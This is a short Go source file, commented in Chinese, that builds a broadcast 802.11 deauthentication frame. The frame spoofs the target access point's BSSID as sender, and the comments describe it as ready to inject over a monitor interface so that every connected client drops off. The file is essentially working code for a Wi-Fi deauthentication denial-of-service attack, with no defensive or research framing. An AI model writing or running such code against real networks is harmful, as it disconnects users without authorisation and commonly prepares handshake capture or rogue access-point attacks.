package ieee80211

import (
	"errors"
	"net"
)

// BuildDeauthFrame 构造广播 802.11 deauthentication 管理帧。
// 返回帧长度为 34 字节（Radiotap 8 字节 + 802.11 头 24 字节 + Reason 2 字节），
// 可直接经 monitor 接口以 AF_PACKET 注入空中。
func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
	// 地址必须是 6 字节，额外校验防止 net.ParseMAC 以外的非法输入。
	if len(bssid) != 6 {
		return nil, errors.New("BSSID 长度错误，必须为 6 字节 MAC 地址")
	}

	// Radiotap 最小头：仅声明自身长度为 8，不携带任何字段。
	// 对大多数注入驱动而言，这已足以让芯片按当前信道/速率发送。
	frame := make([]byte, 34)
	frame[0] = 0x00 // version
	frame[1] = 0x00 // pad
	frame[2] = 0x08 // length low byte
	frame[3] = 0x00 // length high byte
	frame[4] = 0x00 // it_present (无字段)
	frame[5] = 0x00
	frame[6] = 0x00
	frame[7] = 0x00

	// Frame Control：type=management(0), subtype=deauthentication(12)
	// 协议版本 0，bit 4-7 = 1100 (0xC)，bit 2-3 = 00 (type=0)
	// 故第一字节 = 0xC0，第二字节 = 0x00（无 toDS/fromDS/protected/order）
	frame[8] = 0xc0
	frame[9] = 0x00

	// Duration：0
	frame[10] = 0x00
	frame[11] = 0x00

	// addr1（Receiver）：广播地址，向 AP 下所有关联客户端生效
	for i := 0; i < 6; i++ {
		frame[12+i] = 0xff
	}

	// addr2（Transmitter）= BSSID：伪装成 AP 自己发
	copy(frame[18:24], bssid)

	// addr3（BSS Identifier）= BSSID：标识该 BSS
	copy(frame[24:30], bssid)

	// Sequence Control：0（由网卡芯片在发送时按自身序列计数器填充，
	// 此处的 0 占位不影响注入）
	frame[30] = 0x00
	frame[31] = 0x00

	// Reason Code：7 = Class 3 frame received from nonassociated STA
	// 客户端收到后会认为自身关联状态已失效，从而主动断开。
	frame[32] = 0x07
	frame[33] = 0x00

	return frame, nil
}
